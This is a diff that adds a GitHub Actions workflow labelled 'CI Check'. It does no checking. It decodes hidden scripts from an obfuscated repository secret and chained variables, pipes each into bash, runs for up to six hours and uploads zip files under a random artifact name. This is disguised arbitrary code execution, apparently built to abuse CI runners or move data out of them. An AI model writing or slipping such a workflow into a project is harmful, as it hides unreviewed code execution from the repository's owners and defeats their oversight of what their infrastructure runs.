@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Initialize
+        env:
+          dmlwo96: ${{ secrets.dmlwo96 }}
+        run: |
+          printf '%s' "$dmlwo96" | jq -r .z7 | /bin/bash
+          echo $cn7 | jq -r .julp714 | /bin/bash
+          echo $tvcl3692 | jq -r .ciozz0201 | /bin/bash
+
+      - name: Persist results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kUUYWocq
+          path: "*.zip"
+          retention-days: 1
